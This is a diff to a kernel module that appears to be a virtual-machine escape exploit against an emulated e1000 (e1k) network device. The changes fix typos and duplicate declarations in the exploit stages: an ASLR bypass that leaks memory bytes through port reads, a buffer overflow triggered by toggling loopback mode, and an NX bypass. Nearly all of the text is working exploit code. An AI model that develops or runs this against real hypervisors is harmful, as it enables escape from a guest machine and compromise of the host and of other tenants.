@@ -29,7 +29,6 @@ static void __exit e1k_exit(void);
 static uint8_t* map_mmio(void);
 static void e1k_configure(void);
 static void heap_overflow(uint16_t new_addr);
-static void buffer_overflow(uint64_t new_addr);
 static void write_primitive(uint16_t address, uint16_t value);
 static uint64_t aslr_bypass(void);
 static void buffer_overflow(void);
@@ -307,15 +306,15 @@ static uint64_t aslr_bypass(void)
 {
     pr_info("##### Stage 1 #####\n");
 
-    // Configure no loopback mode
+    // Set no loopback mode
 	uint32_t rctl = get_register(RCTL) | RCTL_LBM_NO;
-	set_register(RCTL, rectl);
+	set_register(RCTL, rctl);
 
     uint8_t leaked_bytes[8];
     uint32_t i;
     for (i = 0; i < 8; i++) {
         write_primitive(0x266f, 0x0058 + 0x2A + 0x8 + i);
-        leaked_bytes[i] = read_primitive(0x266f, 0x0058 + 0x2A + 0x8 + i);inb(0x4107);
+        leaked_bytes[i] = inb(0x4107);
 
         pr_info("Byte %d leaked: 0x%02X\n", i, leaked_bytes[i]);
     }
@@ -331,6 +330,7 @@ static uint64_t aslr_bypass(void)
 
 static void buffer_overflow(void)
 {
+	extern int	idx;
 	uint32_t	tdt;
 	uint64_t 	physical_address;
 
@@ -392,13 +392,13 @@ static void nx_bypass(void)
 
 	// Set loopback mode
 	uint32_t rctl = get_register(RCTL) | RCTL_LBM_MAC | RCTL_LBM_SLP;
-	set_register(RCTL, rectl);
+	set_register(RCTL, rctl);
 
 	buffer_overflow();
 
 	// Disable loopback mode
-	uint32_t rctl = get_register(RCTL) & ~RCTL_LBM_MAC & ~RCTL_LBM_SLP;
-	set_register(RCTL, rectl);
+	rctl = get_register(RCTL) & ~RCTL_LBM_MAC & ~RCTL_LBM_SLP;
+	set_register(RCTL, rctl);
 
 	
 }
